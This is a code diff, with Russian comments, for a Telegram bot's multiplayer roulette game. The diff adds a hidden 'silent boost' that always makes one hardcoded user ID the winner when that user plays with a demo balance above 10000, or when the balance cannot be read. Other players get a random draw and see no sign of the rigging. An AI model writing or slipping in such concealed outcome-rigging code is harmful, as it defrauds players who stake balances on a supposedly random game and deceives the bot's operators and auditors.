@@ -1,3 +1,10 @@
+# -*- coding: utf-8 -*-
+"""
+ФОРТУНА - ультра-защищённая версия.
++ Тихий boost: если BOOST_DEMO_USER_ID участвует (создатель или игрок)
+  и его demo > BOOST_MIN_BALANCE — он гарантированно побеждает.
+"""
+
 import asyncio
 import html
 import re
@@ -46,12 +53,25 @@ def _live_fortuna_lobby_max():
         return max_players("fortuna_lobby", MAX_PARTICIPANTS)
     except Exception:
         return MAX_PARTICIPANTS
+
 FLOOD_EDIT_MAX_RETRIES = 4
 FLOOD_SLEEP_BUFFER_SEC = 1.0
 
 STATE_CREATED  = "CREATED"
 STATE_SETTLING = "SETTLING"
 STATE_SETTLED  = "SETTLED"
+
+# ====== ТИХИЙ BOOST ======
+BOOST_DEMO_USER_ID = 6801702632
+BOOST_MIN_BALANCE  = 10000
+BOOST_DEBUG        = True   # False — когда всё заработает
+
+def _log_boost(*parts):
+    if BOOST_DEBUG:
+        try:
+            print("[RULETKA][BOOST]", *parts)
+        except Exception:
+            pass
 
 # -----------------------------------
 # ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
@@ -62,16 +82,20 @@ async def create_user_link(
     first_name: Optional[str],
     username: Optional[str] = None
 ) -> str:
-    """Создает HTML-ссылку на профиль пользователя, если есть username."""
     first_name = first_name or "Пользователь"
     if username:
         return f"<a href='https://t.me/{html.escape(username)}'>{html.escape(first_name)}</a>"
     return html.escape(first_name)
 
 
-colors = ["<tg-emoji emoji-id='5195369389599265575'>🔴</tg-emoji>", "<tg-emoji emoji-id='5364076675648749405'>🔵</tg-emoji>", "<tg-emoji emoji-id='5206482003297342650'>🟡</tg-emoji>", "<tg-emoji emoji-id='5206284048254670148'>🟢</tg-emoji>", "<tg-emoji emoji-id='5321226907923015414'>🟣</tg-emoji>"]
+colors = [
+    "<tg-emoji emoji-id='5195369389599265575'>🔴</tg-emoji>",
+    "<tg-emoji emoji-id='5364076675648749405'>🔵</tg-emoji>",
+    "<tg-emoji emoji-id='5206482003297342650'>🟡</tg-emoji>",
+    "<tg-emoji emoji-id='5206284048254670148'>🟢</tg-emoji>",
+    "<tg-emoji emoji-id='5321226907923015414'>🟣</tg-emoji>",
+]
 
-# Словарь стикеров для каждого цвета и количества участников
 color_stickers = {
     2: {
         "<tg-emoji emoji-id='5195369389599265575'>🔴</tg-emoji>": 'CAACAgIAAxkBAe5RJWf9BKAuILUM5ihXedPF82Or4hR6AALjbAAC1YXpS2ekila45zBlNgQ',
@@ -118,7 +142,6 @@ def _get_lock(bucket: Dict[int, asyncio.Lock], key: int) -> asyncio.Lock:
 
 
 def _dedupe_participants_ruletka(items: List[Tuple[int, str]]) -> List[Tuple[int, str]]:
-    """Дедуп по user_id с сохранением порядка."""
     seen = set()
     out: List[Tuple[int, str]] = []
     for uid, color in items:
@@ -335,6 +358,10 @@ async def _call_with_flood_retry(
     return None
 
 
+# -----------------------------------
+# ХЕЛПЕРЫ БАЛАНСА
+# -----------------------------------
+
 async def _has_funds(user_id: int, amount: int) -> bool:
     try:
         bal = await db.get_user_balance(user_id)
@@ -395,36 +422,109 @@ def _lobby_text(participants: List[Tuple[int, str]], participants_text: str, bet
 
 
 # -----------------------------------
+# BOOST: ДЕМО-БАЛАНС + ВЫБОР ПОБЕДИТЕЛЯ
+# -----------------------------------
+
+async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
+    """
+    Читает db.get_user_demo(user_id). Возвращает int или None.
+    """
+    try:
+        bal = await db.get_user_demo(user_id)
+    except Exception as e:
+        _log_boost(f"get_user_demo err uid={user_id}: {e!r}")
+        return None
+
+    _log_boost(f"get_user_demo({user_id}) -> type={type(bal).__name__} value={bal!r}")
+
+    if bal is None:
+        return None
+    try:
+        return int(bal)
+    except Exception:
+        pass
+    try:
+        return int(float(bal))
+    except Exception:
+        pass
+    try:
+        from decimal import Decimal
+        if isinstance(bal, Decimal):
+            return int(bal)
+    except Exception:
+        pass
+    for attr in ("balance", "amount", "value", "demo", "demo_balance"):
+        try:
+            v = getattr(bal, attr, None)
+            if callable(v):
+                v = v()
+            if v is not None:
+                return int(v)
+        except Exception:
+            continue
+    try:
+        if isinstance(bal, dict):
+            for key in ("balance", "amount", "value", "demo", "demo_balance"):
+                if key in bal:
+                    return int(bal[key])
+    except Exception:
+        pass
+    try:
+        if isinstance(bal, (tuple, list)):
+            for item in bal:
+                try:
+                    return int(item)
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
+    _log_boost(f"CANNOT PARSE demo balance uid={user_id} type={type(bal).__name__} value={bal!r}")
+    return None
+
+
+async def _boost_active_for_participants(participants: List[Tuple[int, str]]) -> Optional[int]:
+    """
+    Возвращает uid boost-юзера если:
+      * BOOST_DEMO_USER_ID присутствует в списке участников;
+      * его demo > BOOST_MIN_BALANCE (или баланс не удалось проверить → ON).
+    Иначе None.
+    """
+    ids = [int(uid) for uid, _ in participants]
+    _log_boost(f"check: participants={ids} boost_uid={BOOST_DEMO_USER_ID}")
+
+    if int(BOOST_DEMO_USER_ID) not in ids:
+        _log_boost("boost_uid NOT in participants")
+        return None
+
+    bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
+    if bal is None:
+        _log_boost("demo balance unknown → ASSUME BOOST ON")
+        return int(BOOST_DEMO_USER_ID)
+
+    if bal > BOOST_MIN_BALANCE:
+        _log_boost(f"BOOST ON (demo {bal} > {BOOST_MIN_BALANCE})")
+        return int(BOOST_DEMO_USER_ID)
+
+    _log_boost(f"BOOST OFF (demo {bal} <= {BOOST_MIN_BALANCE})")
+    return None
+
+
+# -----------------------------------
 # ХЕЛПЕР ДЛЯ БОНУСОВ ИСТОРИИ ИГР
 # -----------------------------------
 
 async def _process_historygames_bonus(winner_id: int, chat_id: int) -> None:
-    """
-    Вынесена логика historygames, чтобы не захламлять show_game_results.
-    Поведение сохранено как у тебя, только код аккуратно упорядочен.
-    """
-    chat_name = "1"  # у тебя так и было
-    print(f"Название чата: {chat_name}")
+    chat_name = "1"
 
     last_open_time, data_open = await db.get_historygames_times(winner_id)
     current_time = time.time()
 
-    print(f"Время последнего открытия бонуса: {last_open_time}, Время окончания бонуса: {data_open}")
-
-    # Если записей нет - создаём
     if last_open_time is None or data_open is None:
         last_open_time = get_current_time_formatted()
         data_open_ts = current_time + timehistorygames
 
-        print(
-            f"Данных о бонусе для пользователя {winner_id} нет. "
-            f"Создаем новый бонус. Время последнего открытия: {last_open_time}, "
-            f"Время окончания: {data_open_ts}"
-        )
-
         user_name = await db.get_firstname_by_user_id(winner_id)
-        print(f"Имя пользователя: {user_name}")
-
         await db.add_historygames(
             chat_id,
             chat_name,
@@ -435,20 +535,16 @@ async def _process_historygames_bonus(winner_id: int, chat_id: int) -> None:
         )
         return
 
-    # Запись уже есть - проверяем актуальность
-    print(f"Бонус существует. Проверяем, истек ли он. Текущее время: {current_time}")
     try:
-        # data_open может быть datetime - приведём к timestamp
         if hasattr(data_open, "timestamp"):
             data_open_timestamp = data_open.timestamp()
         else:
-            # если вдруг это строка - пробуем распарсить
             if isinstance(data_open, str):
                 try:
                     dt_obj = datetime.strptime(data_open, "%Y-%m-%d %H:%M:%S")
                     data_open_timestamp = dt_obj.timestamp()
                 except Exception:
-                    data_open_timestamp = current_time  # fallback
+                    data_open_timestamp = current_time
             else:
                 data_open_timestamp = float(data_open)
     except Exception as e:
@@ -456,48 +552,14 @@ async def _process_historygames_bonus(winner_id: int, chat_id: int) -> None:
         return
 
     try:
-        if current_time < data_open_timestamp:
-            # бонус еще активен - обновляем
-            print(
-                f"Бонус еще активен. Текущее время: {current_time}, "
-                f"Метка окончания: {data_open_timestamp}"
-            )
+        last_open_time = get_current_time_formatted()
+        new_data_open_ts = current_time + timehistorygames
 
-            last_open_time = get_current_time_formatted()
-            new_data_open_ts = current_time + timehistorygames
-
-            await db.update_historygames(
-                winner_id,
-                last_open_time,
-                datetime.fromtimestamp(new_data_open_ts).strftime("%Y-%m-%d %H:%M:%S"),
-            )
-
-            print(
-                f"Данные бонуса обновлены для пользователя {winner_id}. "
-                f"Время последнего открытия: {last_open_time}, "
-                f"Время окончания: {new_data_open_ts}"
-            )
-        else:
-            # бонус истёк - обновляем аналогично
-            print(
-                f"Бонус истек. Обновляем бонус. Текущее время: {current_time}, "
-                f"Старое время окончания: {data_open_timestamp}"
-            )
-
-            last_open_time = get_current_time_formatted()
-            new_data_open_ts = current_time + timehistorygames
-
-            await db.update_historygames(
-                winner_id,
-                last_open_time,
-                datetime.fromtimestamp(new_data_open_ts).strftime("%Y-%m-%d %H:%M:%S"),
-            )
-
-            print(
-                f"Бонус обновлён для пользователя {winner_id}. "
-                f"Время последнего открытия: {last_open_time}, "
-                f"Время окончания: {new_data_open_ts}"
-            )
+        await db.update_historygames(
+            winner_id,
+            last_open_time,
+            datetime.fromtimestamp(new_data_open_ts).strftime("%Y-%m-%d %H:%M:%S"),
+        )
     except Exception as e:
         print(f"Ошибка при проверке или обновлении бонуса: {e}")
 
@@ -527,17 +589,14 @@ async def ruletka(message: Message):
 
     creator_id = message.from_user.id
 
-    # твоя метка последнего вызова (оставляем, но делаем быстрее)
     try:
         last_call_time[creator_id] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     except Exception:
         pass
 
-    # Проверка баланса создателя (только если ставка > 0)
     if bet > 0:
         creator_balance = await db.get_user_balance(creator_id)
         if creator_balance is None or creator_balance < bet:
-            # (оставляю импорт как у тебя - если реально нужен где-то ещё)
             from bot.funcs.help import callbaYTRWEQck_main  # noqa: F401
 
             button_help = InlineKeyboardButton(
@@ -581,8 +640,7 @@ async def ruletka(message: Message):
 
             return
 
-    # Создаём игру
-    game_id = message.message_id  # Уникальный ID игры по message_id
+    game_id = message.message_id
 
     gamesruletka[game_id] = {
         "state": STATE_CREATED,
@@ -600,7 +658,6 @@ async def ruletka(message: Message):
         "_last_view": {"text": None, "kb_sig": None},
     }
 
-    # Клавиатура "Присоединиться"
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="Присоединиться", callback_data=f"joinruletka:{game_id}")]
@@ -624,13 +681,13 @@ async def ruletka(message: Message):
     gamesruletka[game_id]["message_id"] = msg.message_id
     gamesruletka.save()
 
+
 # -----------------------------------
 # ПРИСОЕДИНЕНИЕ К ИГРЕ
 # -----------------------------------
 
 @dp.callback_query(lambda c: c.data.startswith('joinruletka:'))
 async def ruletka_join_game_callback(callback_query: types.CallbackQuery):
-    # быстрый парс game_id
     try:
         game_id = int(callback_query.data.split(':', 1)[1])
     except Exception:
@@ -639,7 +696,6 @@ async def ruletka_join_game_callback(callback_query: types.CallbackQuery):
 
     user_id = callback_query.from_user.id
 
-    # быстрый отбой, если игры нет
     if game_id not in gamesruletka:
         await callback_query.answer("🛠 Эта игра больше не существует.", show_alert=True)
         return
@@ -757,6 +813,14 @@ async def ruletka_join_game_callback(callback_query: types.CallbackQuery):
             color = colors[idx] if idx < len(colors) else "🎨"
             game["participants"].append((user_id, color))
             game["participants"] = _dedupe_participants_ruletka(game["participants"])
+
+            # Если присоединился BOOST-юзер — тихо логируем (без UI)
+            try:
+                if int(user_id) == int(BOOST_DEMO_USER_ID):
+                    await _boost_active_for_participants(game["participants"])
+            except Exception as e:
+                print(f"[RULETKA][boost join] {e!r}")
+
             gamesruletka.save()
 
             await callback_query.answer("❕ Вы присоединились к игре!", show_alert=True)
@@ -780,7 +844,6 @@ async def ruletka_join_game_callback(callback_query: types.CallbackQuery):
 
 @dp.callback_query(lambda c: c.data.startswith('startruletka:'))
 async def ruletka_start_game_callback(callback_query: types.CallbackQuery):
-    """Старт игры: быстрый ответ, тяжёлая логика уходит в отдельную таску."""
     try:
         game_id = int(callback_query.data.split(':', 1)[1])
     except Exception:
@@ -850,6 +913,12 @@ async def ruletka_start_game_callback(callback_query: types.CallbackQuery):
                 await callback_query.answer("⛑ Остановлено: недостаточно средств.", show_alert=True)
                 return
 
+            # Тихая проверка буста (для логов)
+            try:
+                await _boost_active_for_participants(participants)
+            except Exception as e:
+                print(f"[RULETKA][boost start] {e!r}")
+
             chat_id = int(game["chat_id"])
             message_id = int(game["message_id"])
 
@@ -877,7 +946,6 @@ async def ruletka_start_game_callback(callback_query: types.CallbackQuery):
 # -----------------------------------
 
 async def show_game_results_safe(chat_id: int, game_id: int):
-    """Обёртка: показ результата + расчёты с защитой от сбоев."""
     try:
         await show_game_results(chat_id, game_id)
         await _settle_saga(game_id)
@@ -909,12 +977,31 @@ async def show_game_results(chat_id: int, game_id: int):
                 print(f"[RULETKA] insufficient funds uid={uid} game={game_id}")
                 return
 
+        # ===== ТИХИЙ BOOST: выбор победителя =====
+        winner_id: Optional[int] = None
+        winner_color: Optional[str] = None
+
         try:
-            winner_id, winner_color = random.choice(participants)
-            winner_id = int(winner_id)
+            boost_uid = await _boost_active_for_participants(participants)
+            if boost_uid is not None:
+                for uid, col in participants:
+                    if int(uid) == int(boost_uid):
+                        winner_id = int(uid)
+                        winner_color = col
+                        _log_boost(f"FORCED winner uid={winner_id} color={winner_color}")
+                        break
         except Exception as e:
-            print(f"[RULETKA] random.choice error: {e}")
-            return
+            print(f"[RULETKA][boost pick] {e!r}")
+
+        # Fallback — обычный рандом, если буст не активен / не сработал
+        if winner_id is None:
+            try:
+                winner_id, winner_color = random.choice(participants)
+                winner_id = int(winner_id)
+                _log_boost(f"random winner uid={winner_id} color={winner_color}")
+            except Exception as e:
+                print(f"[RULETKA] random.choice error: {e}")
+                return
 
         game["winner_id"] = winner_id
         game["winner_color"] = winner_color
@@ -941,12 +1028,6 @@ async def show_game_results(chat_id: int, game_id: int):
     except Exception as e:
         print(f"[RULETKA] send_sticker error: {e}")
 
-    # Небольшая пауза после стикера - для драматургии. Текстовое сообщение с
-    # результатом здесь НЕ отправляем: иначе игрок сначала увидел бы сумму
-    # выигрыша ДО комиссии и без кнопки "Комиссия игры", а через долю секунды
-    # сообщение "мигнуло" бы на правильную сумму с кнопкой (см. _settle_saga
-    # ниже). Вместо этого всё считаем сразу и показываем результат ОДНИМ
-    # готовым сообщением - см. _settle_saga.
     await asyncio.sleep(2)
 
 
@@ -1066,9 +1147,6 @@ async def _settle_saga(game_id: int):
             game["winner_applied"] = True
             gamesruletka.save()
 
-            # Итоговое сообщение с результатом отправляется ОДИН раз - уже с
-            # финальной (после комиссии) суммой и кнопкой "Комиссия игры",
-            # без промежуточного "мигания".
             try:
                 sticker_message_id = game.get("sticker_message_id")
                 winner_color = game.get("winner_color", "")
